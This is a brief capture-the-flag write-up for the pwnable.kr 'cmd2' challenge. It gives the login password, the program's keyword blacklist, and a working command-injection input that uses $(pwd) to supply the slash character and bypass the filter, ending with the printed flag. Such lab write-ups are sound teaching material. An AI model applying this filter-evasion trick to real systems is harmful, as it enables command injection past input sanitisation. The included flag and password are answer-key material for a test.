# cmd2

1. Login into server with passwd: `mommy now I get what PATH environment is for :)`:
```
$ ssh cmd2@pwnable.kr -p2222
$ scp -P2222 cmd2@pwnable.kr:~/* .
```

We have to find a way to execute `/bin/cat/ /home/cmd1/flag` command.

As we cannot use any of these charecters:
```
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
```
I used a hexadecimal code o ascii char `/` which is `0x2F` and created the following input:
```
$(echo -e "\x2Fbin\x2Fcat fla")g

./cmd2 '$(echo -e "\x2Fbin\x2Fcat fla")g'
```
It didn't work unfortunatelly do i found that `pwd` is available after cleaning all the env variables. I used `pwd` for `/` character, using that from `/` folder.

```
cmd2@prowl:~$ ./cmd2 'cd .. && cd .. && $(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla* && cd --'
cd .. && cd .. && $(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla* && cd --
FuN_w1th_5h3ll_v4riabl3s_haha
```

```
FLAG: {FuN_w1th_5h3ll_v4riabl3s_haha}
```